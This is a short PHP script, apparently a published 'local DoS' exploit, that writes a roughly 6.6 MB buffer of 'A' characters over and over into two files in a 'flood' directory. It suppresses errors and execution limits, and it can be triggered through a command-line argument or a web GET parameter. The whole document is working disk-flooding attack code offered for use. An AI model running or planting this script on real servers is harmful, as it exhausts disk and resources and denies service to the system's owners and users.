<?php
// MultiB ( PHP Local Exploit ) For Linux x64
// Local DoS By Afrizal F.A - ICWR-TECH

set_time_limit(0);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('display_errors', 0);
@ini_set('output_buffering',0);
if(!empty($argv[1]) OR !empty($_GET['x'])) {
    $buff="";
    for($x=0;$x<1024;$x++) {
        $buff.="A"; // Buffering
    }

    $extreme_buff="";
    for($x=0;$x<6507;$x++) {
        $extreme_buff.=$buff; // Multi Buffering
    }

    // Checking Directory
    if(!is_dir("flood")) {
        if(is_file("flood")) {
            unlink("flood");
        }
        mkdir("flood");
    }
    // End Check

    if(is_dir("flood")) {
        // Pull
        $pull=array(fopen("flood/heker", "a"), fopen("flood/x64", "a"));
        // End Pull
        for($x=0;$x<$argv[1] or $_GET['x'];$x++) {
            $push_x1=fwrite($pull[0], $extreme_buff) AND fwrite($pull[1], $extreme_buff); // Push
        }
        $close=fclose($pull[0]) AND fclose($pull[1]); // Closing Push
    }
}
